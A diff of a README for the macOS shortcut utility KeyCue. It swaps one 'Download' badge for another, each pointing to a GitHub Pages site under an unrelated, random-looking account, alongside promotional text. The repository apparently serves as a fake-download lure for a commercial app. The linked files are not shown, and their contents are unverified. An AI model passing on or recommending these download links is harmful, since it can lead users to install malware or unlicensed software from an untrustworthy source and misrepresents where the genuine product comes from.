@@ -2,19 +2,15 @@
 
 <div align="center">  
 <img src="https://www.itopnews.de/wp-content/uploads/2025/03/KeyCue-Logo-Foto-KeyCue.jpg" alt="KeyCue Logo" width="256" height="256">  
-</div>  
-
-<div align="center">  
-<a href="https://shikikofa1593.github.io/.github/keycue">  
-<img src="https://img.shields.io/badge/Download_KeyCue_for_Mac-darkgreen?style=for-the-badge&logo=apple" alt="Download KeyCue for Mac">  
-</a>  
-</div>  
+</div>   
 
 ---
 
 ## What is KeyCue for Mac?
 
 KeyCue is an innovative and highly useful utility designed specifically for macOS users who want to master keyboard shortcuts and enhance their productivity. It serves as a personal keyboard shortcut trainer and cheat sheet system, instantly displaying available commands for the currently active application.
+
+[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://p0763235.github.io/.github/keycue-keyboard-shortcut-helper)
 
 Simply hold down the Command (⌘) key for a moment, and KeyCue will present a clear, organized overlay showing all relevant keyboard shortcuts. This eliminates the need to dig through complex menus or memorize hundreds of commands, making it an essential tool for anyone using software like Adobe Creative Suite, Microsoft Office, Final Cut Pro, or any other application with extensive shortcut sets.
 
